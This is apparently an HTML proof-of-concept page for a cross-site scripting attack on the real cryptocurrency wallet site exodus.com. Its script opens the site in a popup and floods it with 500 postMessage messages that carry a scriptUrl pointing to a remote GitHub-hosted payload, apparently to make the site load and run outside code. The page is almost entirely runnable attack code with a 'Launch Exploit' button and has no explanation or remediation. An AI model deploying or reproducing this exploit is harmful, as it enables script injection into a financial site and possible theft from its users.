<!DOCTYPE html>
<html>
<head>
  <title>🚨 Exodus XSS PoC</title>
</head>
<body style="font-family: sans-serif; background: #111; color: white; text-align: center; padding-top: 60px">
  <h1>💥 Exodus XSS PoC</h1>
  <p>Click the button to open <code>exodus.com</code> and send 500 postMessage XSS injections</p>

  <button style="padding: 10px 20px; font-size: 18px; cursor: pointer" onclick="launchXSS()">🚀 Launch Exploit</button>

  <script>
    function launchXSS() {
      const exo = window.open("https://www.exodus.com", "exo", "width=1000,height=800");

      if (!exo) {
        alert("❌ Popup blocked! Please allow popups and try again.");
        return;
      }

      let count = 0;
      const total = 500;
      const interval = 100; // 10 requests per second

      setTimeout(() => {
        const flood = setInterval(() => {
          if (count >= total) {
            clearInterval(flood);
            console.log("✅ Done sending 500 postMessage requests.");
            return;
          }

          try {
            exo.postMessage({
              type: "event_builder_bootstrap",
              scriptUrl: "https://raw.githubusercontent.com/Baali07/XSS-PoC/main/x.js?t=" + Date.now()
            }, "https://www.exodus.com");

            console.log(`📨 Sent ${count + 1}`);
            count++;
          } catch (e) {
            console.error("❌ Failed to send message:", e);
          }

        }, interval);
      }, 3000); // Wait for exodus to load and activate listener
    }
  </script>
</body>
